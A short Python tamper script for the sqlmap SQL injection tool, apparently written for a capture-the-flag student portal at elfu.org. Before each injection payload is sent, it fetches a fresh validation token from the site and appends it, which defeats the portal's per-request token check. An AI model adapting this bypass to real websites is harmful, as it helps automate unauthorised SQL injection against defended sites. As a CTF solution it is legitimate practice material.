#!/usr/bin/env python

"""
Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import requests
import urllib

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
	pass

def tamper(payload, **kwargs):
	url = "https://studentportal.elfu.org/validator.php"
	r = requests.get(url)

	return urllib.quote(payload) + "&token=" + r.text
